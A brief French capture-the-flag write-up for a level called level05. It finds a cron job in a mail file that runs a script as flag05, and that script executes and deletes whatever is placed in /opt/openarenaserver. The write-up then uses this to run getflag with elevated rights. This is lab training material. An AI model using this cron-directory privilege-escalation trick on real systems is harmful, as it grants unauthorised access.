Quand on arrive sur le level05, on nous dit qu'on a recu un mail.
En faisant un `find / -name mail 2>/dev/null`, on trouve un dossier /var/mail.

Ce dossier contient level05 et dans ce fichier on peut voir `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`

On affiche openarenaserver:

```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

On voit que le script regarde dans le dossier `/opt/openarenaserver/`, execute ce qu'il y'a dedans et supprime le fichier.

On fait donc un script qui appelle getflag et met le resultat dans un fichier: 
`echo "getflag > /tmp/getflag" > getflag.sh`

Il faut pas que le fichier existe avant.

On fait `cat /tmp/getflag` et on obtient donc le flag.